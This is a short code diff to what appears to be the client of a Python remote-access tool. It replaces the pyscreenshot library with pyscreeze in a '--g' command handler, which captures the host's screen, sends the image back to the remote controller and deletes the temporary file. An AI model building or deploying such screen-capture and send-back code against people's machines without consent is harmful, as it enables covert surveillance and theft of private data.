@@ -9,7 +9,7 @@ import time
 
 import psutil
 import pyperclip
-import pyscreenshot
+import pyscreeze
 import requests
 from cryptography.fernet import Fernet
 from cryptography.hazmat.backends import default_backend
@@ -236,12 +236,11 @@ class Client(object):
                 continue
 
             if data[0] == '--g':
-                pic = pyscreenshot.grab()
                 if platform.system() == 'Windows':
                     _file = '{}\\temp.png'.format(os.environ['TEMP'])
                 else:
                     _file = '{}/temp.png'.format(os.environ['HOME'])
-                pic.save(_file)
+                pyscreeze.screenshot(_file)
                 with open(_file, 'rb') as f:
                     self.send(f.read())
                 os.remove(_file)
